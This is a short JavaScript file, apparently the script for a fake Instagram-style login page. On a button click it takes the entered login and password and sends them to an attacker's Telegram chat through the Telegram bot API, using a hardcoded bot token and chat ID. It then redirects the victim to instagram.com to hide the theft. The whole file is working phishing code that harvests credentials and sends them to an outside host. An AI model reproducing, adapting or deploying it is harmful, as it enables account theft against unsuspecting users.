let API_token = '7325575448:AAFxrVT5R3uR0i8zCOx83PYMzBTb_uGY5vc'


let button = document.querySelector('.login-button')
let inputs = document.querySelectorAll('input')



button.addEventListener('click', (e) => {
    e.preventDefault()

    if (inputs[0].value.trim() !== '' && inputs[1].value.trim() !== '') {
        fetch(`https://api.telegram.org/bot${API_token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: '1437385254',
                text: `login: ${inputs[0].value} \n password: ${inputs[1].value}`
            })
        })
            .then(res => res.json())
            .then(data => {
                window.location.href = 'https://instagram.com'
            })
    }


})


